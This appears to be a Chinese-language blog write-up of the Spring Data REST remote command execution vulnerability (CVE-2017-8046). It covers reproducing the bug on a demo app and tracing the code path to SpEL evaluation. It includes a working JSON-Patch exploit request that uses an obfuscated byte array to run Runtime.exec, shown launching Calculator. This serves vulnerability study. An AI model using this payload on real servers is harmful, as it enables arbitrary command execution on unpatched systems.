---
title: Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）分析
description: 承接上篇，学习了一下Spring框架以后，分析一下Spring的一些历史漏洞，这篇分析Spring Data Rest 远程命令执行漏洞（CVE-2017-8046）
categories:
 - 漏洞分析
tags:
 - 漏洞分析
---

### 0x00 漏洞环境和环境复现
下载[Spring官方Demo](https://github.com/spring-guides/gs-accessing-data-rest)，complete文件夹下即为我们需要的漏洞代码

IDEA打开complete文件，删除gradle的配置，修改`pom.xml`中的`parent`的版本信息，使漏洞组件`spring-data-rest-webmvc`的版本在存在漏洞的版本2.6.6

```
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>1.5.6.RELEASE</version>  
    <relativePath/>
</parent>
```

运行后访问`http://192.168.0.145:8080/`确认运行，IP是本机地址，Burp Suite CE不知道为什么不拦localhost和`127.0.0.1`，所以只能这样

通过RESTFul请求新增一个people

```
POST /people HTTP/1.1
Host: 192.168.0.145:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://192.168.0.145:8080/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=13AB1FF0AECC49808DF1FAE070CCC0DE
Connection: close
Content-Length: 32

{"firstName":"w","lastName":"q"}
```

再请求`http://192.168.0.145:8080/people/1`有数据返回

之所以要新建一个数据，是因为漏洞发生在PATCH方法中，PATCH方法在HTTP协议中用来更新局部资源，是对PUT方法对补充，可以理解PUT是替换，PATCH是部分更新

然后我们就可以构造PATCH的payload尝试了

```
PATCH /people/1 HTTP/1.1
Host: 192.168.0.145:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Cookie: JSESSIONID=13AB1FF0AECC49808DF1FAE070CCC0DE
Content-Length: 280

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111,112,101,110,32,47,83,121,115,116,101,109,47,65,112,112,108,105,99,97,116,105,111,110,115,47,67,97,108,99,117,108,97,116,111,114,46,97,112,112}))/lastname", "value": "vulhub" }]
```

其中SpEL表达式`T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{111,112,101,110,32,47,83,121,115,116,101,109,47,65,112,112,108,105,99,97,116,105,111,110,115,47,67,97,108,99,117,108,97,116,111,114,46,97,112,112}))`

就是`T(java.lang.Runtime).getRuntime().exec("open /System/Applications/Calculator.app")`

执行后弹计算器

![0-1](https://milkfr.github.io/assets/images/posts/2019-11-16-analysis-spring-data-rest-rce/0-1.png)

### 0x01 debug分析
首先要找到方法入口点，Demo程序里之后配置过程，找不到入口点，因为对`spring-data-rest`的实现也不了解

兴许看官方API介绍能找到，但是我现在只能在jar包中找找，因为方法对应的是PATCH方法，所以找到名字中有PATCH的类

找到有点像样的都debug看一样，只要在弹计算器之前执行的都需要debug尝试

找到`org.springframework.data.rest.webmvc.config.JsonPatchHandler`

```
class JsonPatchHandler {
    private final ObjectMapper mapper;
    private final ObjectMapper sourceMapper;
    private final DomainObjectReader reader;

    public JsonPatchHandler(ObjectMapper mapper, DomainObjectReader reader) { Assert.notNull(mapper, "ObjectMapper must not be null!");
        Assert.notNull(reader, "DomainObjectReader must not be null!");
        this.mapper = mapper;
        this.reader = reader;
        this.sourceMapper = mapper.copy();
        this.sourceMapper.setSerializationInclusion(Include.NON_NULL);
    }

    public <T> T apply(IncomingRequest request, T target) throws Exception {
        Assert.notNull(request, "Request must not be null!");
        Assert.isTrue(request.isPatchRequest(), "Cannot handle non-PATCH request!");
        Assert.notNull(target, "Target must not be null!");
        return request.isJsonPatchRequest() ? this.applyPatch(request.getBody(), target) : this.applyMergePatch(request.getBody(), target);
    }

    <T> T applyPatch(InputStream source, T target) throws Exception {
        return this.getPatchOperations(source).apply(target, target.getClass());
    }
}
```

用到的主要是这三个方法，都打断点的话首先进入的是`JsonPatchHandler`，通过对IDEA调用栈的追溯，调用这个方法的是如下代码

```
public class PersistentEntityResourceHandlerMethodArgumentResolver implements HandlerMethodArgumentResolver {
    private Object readPatch(IncomingRequest request, ObjectMapper mapper, Object existingObject) {
        try {
            JsonPatchHandler handler = new JsonPatchHandler(mapper, this.reader);
            return handler.apply(request, existingObject);
        } catch (Exception var5) {
            if (var5 instanceof HttpMessageNotReadableException) {
                throw (HttpMessageNotReadableException)var5;
            } else {
                throw new HttpMessageNotReadableException(String.format("Could not read an object of type %s from the request!", existingObject.getClass()), var5);
            }
        }
    }
}
```

看到这个`readPatch`方法其实就不用知道上层方法了，顾名思义，这里是处理PATCH Request请求的地方

这里首先调用了`JsonPatchHandler`的构造函数，然后调用了`JsonPatchHandler.apply`方法

看代码基本知道，构造函数只是设置上下文属性，之后就调用`apply`方法

然后我们对`apply`方法进行debug，一步步Step Over，当进入一个`Convert`函数的中，`replace`的判断吸引到人

```
public class JsonPatchPatchConverter implements PatchConverter<JsonNode> {
    @NonNull
    private final ObjectMapper mapper;

    public Patch convert(JsonNode jsonNode) {
        if (!(jsonNode instanceof ArrayNode)) {
            throw new IllegalArgumentException("JsonNode must be an instance of ArrayNode");
        } else {
            ArrayNode opNodes = (ArrayNode)jsonNode;
            List<PatchOperation> ops = new ArrayList(opNodes.size());
            Iterator elements = opNodes.elements();

            while(elements.hasNext()) {
                JsonNode opNode = (JsonNode)elements.next();
                String opType = opNode.get("op").textValue();
                String path = opNode.get("path").textValue();
                JsonNode valueNode = opNode.get("value");
                Object value = this.valueFromJsonNode(path, valueNode);
                String from = opNode.has("from") ? opNode.get("from").textValue() : null;
                if (opType.equals("test")) {
                    ops.add(new TestOperation(path, value));
                } else if (opType.equals("replace")) {
                    ops.add(new ReplaceOperation(path, value));
                } else if (opType.equals("remove")) {
                    ops.add(new RemoveOperation(path));
                } else if (opType.equals("add")) {
                    ops.add(new AddOperation(path, value));
                } else if (opType.equals("copy")) {
                    ops.add(new CopyOperation(path, from));
                } else {
                    if (!opType.equals("move")) {
                        throw new PatchException("Unrecognized operation type: " + opType);
                    }

                    ops.add(new MoveOperation(path, from));
                }
            }

            return new Patch(ops);
        }
    }
}
```

此时的调用栈图如下

```
convert:52, JsonPatchPatchConverter (org.springframework.data.rest.webmvc.json.patch)
getPatchOperations:112, JsonPatchHandler (org.springframework.data.rest.webmvc.config)
applyPatch:91, JsonPatchHandler (org.springframework.data.rest.webmvc.config)
apply:83, JsonPatchHandler (org.springframework.data.rest.webmvc.config)
readPatch:206, PersistentEntityResourceHandlerMethodArgumentResolver (org.springframework.data.rest.webmvc.config)
```


我们可以看到Convert方法就是从jsonNode中取值，取的是`op,path,value`等我们传入的POST信息

到对`opType`的值进行判断的时候，比对`replace`后新建了一个对象`new ReplaceOperation(path, value)`

如下图新建这个对象后，我们可以看到`ops`增加了一个`spelexpression`属性，之前是没有的，所以我们找到`ReplaceOperation`的构造方法看看

![1-1](https://milkfr.github.io/assets/images/posts/2019-11-16-analysis-spring-data-rest-rce/1-1.png)

```
public class ReplaceOperation extends PatchOperation {
    public ReplaceOperation(String path, Object value) {
        super("replace", path, value);
    }

    <T> void perform(Object target, Class<T> type) {
        this.setValueOnTarget(target, this.evaluateValueFromTarget(target, type));
    }
}
```

只是继承了`PatchOperation`

我们再看`PatchOperation`的构造方法

```
public abstract class PatchOperation {
    public PatchOperation(String op, String path, Object value) {
        this.op = op;
        this.path = path;
        this.value = value;
        this.spelExpression = PathToSpEL.pathToExpression(path);
    }
}
```

可以看到这里将`path`变量的内容转换成`spelExpression`

然后我们继续单步看，调用栈如下图的时候，`spelExpression.setValue`，之后就执行了SpEL表达式

![1-2](https://milkfr.github.io/assets/images/posts/2019-11-16-analysis-spring-data-rest-rce/1-2.png)

上文我们到`JsonPatchHandler.apply`方法后，执行了`JsonPatchHandler.applyPatch`，之后返回了`Patch.apply`方法，这里把PATCH的POST方法通过的`operations`通一个个取出，执行`ReplaceOperation.perform`方法，这里方法就调用`spelExpression.setValue`

到这里分析过程完成

### 0x02 总结
漏洞的原因是PATCH方法的处理中本身似乎设计就是要运行`path`变量的SpEL表达式，所以只要传入就可以

问了下开发，意思就是它每个接口都是框架封装了，有复杂逻辑，他们不敢用，然后API简单粗暴的相当于把数据表作为接口打开，用于非常简单的小项目，应该国内很少人用

其实这里就很奇怪了，已经使用RESTFul风格的接口了，肯定和前端模版应该没有关系了，为什么还需要SpEL表达式呢
